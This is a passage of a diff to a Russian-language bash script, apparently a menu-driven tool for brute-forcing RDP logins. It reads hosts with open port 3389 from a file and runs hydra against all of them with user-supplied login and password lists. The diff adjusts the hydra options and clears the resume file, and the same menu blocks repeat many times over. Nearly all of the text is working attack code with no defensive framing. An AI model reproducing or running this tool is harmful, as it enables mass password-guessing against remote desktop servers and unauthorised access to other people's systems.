 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13594,7 +14358,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13603,7 +14367,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13631,6 +14395,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13642,7 +14410,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13652,7 +14420,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13662,7 +14430,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13671,7 +14439,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13700,6 +14468,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13711,7 +14483,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13721,7 +14493,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13731,7 +14503,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13740,7 +14512,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13768,6 +14540,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13779,7 +14555,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13789,7 +14565,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13799,7 +14575,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13808,7 +14584,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13836,6 +14612,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13847,7 +14627,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13857,7 +14637,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13867,7 +14647,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13876,7 +14656,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13904,6 +14684,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13915,7 +14699,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13925,7 +14709,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13935,7 +14719,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13944,7 +14728,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13972,6 +14756,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13983,7 +14771,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13993,7 +14781,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14003,7 +14791,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14012,7 +14800,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14040,6 +14828,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14051,7 +14843,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14061,7 +14853,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14071,7 +14863,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14080,7 +14872,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14109,6 +14901,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14120,7 +14916,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14130,7 +14926,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14140,7 +14936,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14149,7 +14945,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14177,6 +14973,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14188,7 +14988,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14198,7 +14998,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14208,7 +15008,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14217,7 +15017,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14246,6 +15046,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14257,7 +15061,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14267,7 +15071,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14277,7 +15081,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14286,7 +15090,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14316,6 +15120,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14327,7 +15135,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14337,7 +15145,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14347,7 +15155,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14356,7 +15164,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14383,6 +15191,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -14394,7 +15206,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14404,7 +15216,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -14414,7 +15226,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
